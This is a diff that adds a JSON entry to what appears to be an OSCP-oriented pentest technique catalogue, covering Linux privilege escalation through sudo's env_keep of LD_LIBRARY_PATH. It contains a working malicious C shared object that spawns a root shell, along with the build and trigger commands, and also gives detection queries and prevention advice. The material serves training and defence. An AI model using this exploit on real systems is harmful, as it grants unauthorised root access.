@@ -1,0 +1,107 @@
+{
+  "id": "linux-ld-library-path",
+  "name": "LD_LIBRARY_PATH sudo env_keep library hijack",
+  "command": "sudo LD_LIBRARY_PATH=/tmp <allowed_binary>   # load attacker .so as root",
+  "description": "When sudoers preserves LD_LIBRARY_PATH (via Defaults env_keep+=LD_LIBRARY_PATH) for a command a user may run as root, the attacker builds a malicious shared object exporting a symbol the target binary resolves, places it in a writable directory, and points LD_LIBRARY_PATH there. The dynamic linker loads the attacker library into the root process, running attacker code as root. A classic GTFOBins-style sudo environment-variable hijack distinct from LD_PRELOAD.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Sudo Abuse",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "GTFOBins / HTB Linux Privilege Escalation",
+  "tags": [
+    "ld-library-path",
+    "sudo",
+    "env_keep",
+    "shared-object",
+    "library-hijack",
+    "privesc"
+  ],
+  "mitre": [
+    "T1548.003",
+    "T1574.006"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHAT IT IS ===\n  LD_LIBRARY_PATH adds directories the dynamic linker searches for shared libraries\n  BEFORE the system paths. If sudo keeps this variable for a root-allowed command,\n  you can force that command to load YOUR library instead of the real one.\n\n=== CHECK ===\n  sudo -l\n  # look for:  env_keep+=LD_LIBRARY_PATH   AND a command you can run as root\n  # find which libs the target needs:\n  ldd /path/to/allowed_binary\n\n=== BUILD MALICIOUS .so ===\n  # Replace a library the binary loads (e.g. libcrypt.so.1). Use a constructor so\n  # it fires on load regardless of which symbol is resolved:\n  cat > /tmp/lib.c <<'EOF'\n  #include <stdio.h>\n  #include <stdlib.h>\n  #include <unistd.h>\n  static void init(void) __attribute__((constructor));\n  void init(void){ setuid(0); setgid(0); system(\"/bin/bash -p\"); }\n  EOF\n  gcc -shared -fPIC -nostartfiles -o /tmp/libcrypt.so.1 /tmp/lib.c\n\n=== TRIGGER ===\n  sudo LD_LIBRARY_PATH=/tmp <allowed_binary>\n  # linker finds /tmp/libcrypt.so.1 first, constructor runs as root -> root shell\n\n=== NOTE vs LD_PRELOAD ===\n  LD_PRELOAD force-loads one file; LD_LIBRARY_PATH changes the SEARCH PATH so a\n  same-named library in your dir wins. Use LD_LIBRARY_PATH when env_keep allows it\n  but LD_PRELOAD is stripped.\n\n=== ALTERNATIVES ===\n  ld-preload (LD_PRELOAD variant); GTFOBins per-binary library tricks",
+  "examples": [
+    {
+      "label": "Check sudo env_keep for LD_LIBRARY_PATH",
+      "command": "sudo -l"
+    },
+    {
+      "label": "Build a constructor .so matching a needed library name",
+      "command": "gcc -shared -fPIC -nostartfiles -o /tmp/libcrypt.so.1 /tmp/lib.c"
+    },
+    {
+      "label": "Run the allowed binary with the hijacked search path",
+      "command": "sudo LD_LIBRARY_PATH=/tmp <allowed_binary>"
+    }
+  ],
+  "references": [
+    {
+      "title": "GTFOBins - LD_LIBRARY_PATH / library load",
+      "url": "https://gtfobins.github.io/"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "man ld.so (LD_LIBRARY_PATH)",
+      "url": "https://man7.org/linux/man-pages/man8/ld.so.8.html"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ld-preload",
+      "note": "LD_PRELOAD variant of the same sudo library-hijack.",
+      "rel": "alternative"
+    },
+    {
+      "id": "sudo-abuse",
+      "note": "Parent technique: abusing sudoers configuration.",
+      "rel": "prereq"
+    },
+    {
+      "id": "find-suid-sgid",
+      "note": "Enumerate other local vectors when env_keep is absent.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "The dynamic linker searches LD_LIBRARY_PATH directories before the default system paths. sudo normally scrubs dangerous environment variables, but if sudoers explicitly preserves LD_LIBRARY_PATH via env_keep, the attacker-controlled directory is searched first while the command runs as root, so a same-named malicious library is loaded into the privileged process.",
+    "prerequisites": "A sudoers rule letting the user run a dynamically-linked command as root, with Defaults env_keep+=LD_LIBRARY_PATH (ld.so ignores LD_LIBRARY_PATH for SUID binaries, so this specifically needs the sudo env_keep misconfiguration). A writable directory and gcc (or a precompiled .so).",
+    "impact": "Arbitrary code execution as root via a hijacked shared library - a direct, quiet local privilege escalation from a single sudoers misconfiguration.",
+    "detection": "[MITRE T1574.006] sudo invocations carrying LD_LIBRARY_PATH; root processes loading shared objects from world-writable paths (/tmp, /dev/shm, user home); auditd showing a root-owned process dlopen-ing a library outside standard library directories.",
+    "artifacts": "sudo logs recording the preserved LD_LIBRARY_PATH; auditd execve with LD_LIBRARY_PATH in the environment; a .so in /tmp or /dev/shm loaded by a setuid-root process; recently compiled library with a system library name in a writable dir.",
+    "splunk_spl": "index=linux sourcetype=\"linux:auditd\" type=EXECVE\n| search (a0=\"*LD_LIBRARY_PATH=*\" OR proctitle=\"*LD_LIBRARY_PATH=*\") proctitle=\"*sudo*\"\n| table _time, host, auid, exe, proctitle",
+    "elastic_kql": "process.name:sudo and process.env_vars:*LD_LIBRARY_PATH=/tmp* or process.env_vars:*LD_LIBRARY_PATH=/dev/shm*",
+    "sentinel_kql": "Syslog\n| where SyslogMessage has \"sudo\" and SyslogMessage has \"LD_LIBRARY_PATH\"\n| project TimeGenerated, Computer, SyslogMessage\n| sort by TimeGenerated desc\n// sudo preserving LD_LIBRARY_PATH to load an attacker library as root",
+    "sigma_rules": "lnx_sudo_ld_library_path_hijack (sudo command run with an attacker LD_LIBRARY_PATH)",
+    "prevention": "Never add LD_LIBRARY_PATH (or LD_PRELOAD) to sudoers env_keep; rely on sudo's default env_reset. Audit /etc/sudoers and /etc/sudoers.d for env_keep entries. Keep sudo current and grant the narrowest possible commands.",
+    "sources": [
+      "https://gtfobins.github.io/",
+      "https://man7.org/linux/man-pages/man8/ld.so.8.html"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "sudo with attacker LD_LIBRARY_PATH (library hijack)",
+        "logic": "Syslog\n| where SyslogMessage has \"sudo\" and SyslogMessage has \"LD_LIBRARY_PATH\"\n| where SyslogMessage has_any (\"/tmp\",\"/dev/shm\",\"/home\")\n| project TimeGenerated, Computer, SyslogMessage",
+        "data_source": "linux-audit",
+        "attack": [
+          "T1548.003",
+          "T1574.006"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Developers occasionally set LD_LIBRARY_PATH, but rarely through sudo to a world-writable directory.",
+        "tuning": "Alert specifically when LD_LIBRARY_PATH points at /tmp, /dev/shm or a user-writable path under sudo."
+      }
+    ]
+  }
+}
